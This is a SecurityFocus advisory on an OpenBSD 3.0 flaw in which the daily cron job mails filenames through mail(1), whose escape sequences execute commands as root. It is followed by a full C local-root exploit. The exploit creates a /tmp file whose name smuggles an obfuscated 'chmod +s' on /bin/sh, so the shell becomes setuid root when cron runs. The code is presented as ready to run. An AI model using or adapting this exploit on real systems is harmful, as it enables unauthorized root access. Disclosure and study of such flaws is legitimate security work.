source: http://www.securityfocus.com/bid/4495/info

OpenBSD ships with a number of cron jobs configured by default. The tasks are for the purpose of summarizing system information.

The mail(1) utility is used to send the summaries to the root user. This utility supports escaped characters in message text indicating commands to be executed during processing.

If attacker-supplied data can be included in the message text passed to mail(1), commands specified by the attacker may be executed as root. If the attacker embeds the escape sequence followed by an arbitrary command in this data, the commands will be executed as root when the cron task runs. It is possible for an attacker to embed data in filenames, which are included in the emails. 

/*
 * (c) 2002 venglin@freebsd.lublin.pl
 *
 * OpenBSD 3.0 (before 08 Apr 2002)
 * /etc/security + /usr/bin/mail local root exploit
 *
 * Run the exploit and wait for /etc/daily executed from crontab.
 * /bin/sh will be suid root next day morning.
 *
 * Credit goes to urbanek@openbsd.cz for discovering vulnerability.
 *
 */

#include <fcntl.h>

int main(void)
{
        int fd;

        chdir("/tmp");
        fd = open("\n~!chmod +s `perl -e 'print \"\\057\\142\\151\\156\\057\\163\\150\"'`\n", O_CREAT|O_WRONLY, 04777);

        if (fd)
                close(fd);
}
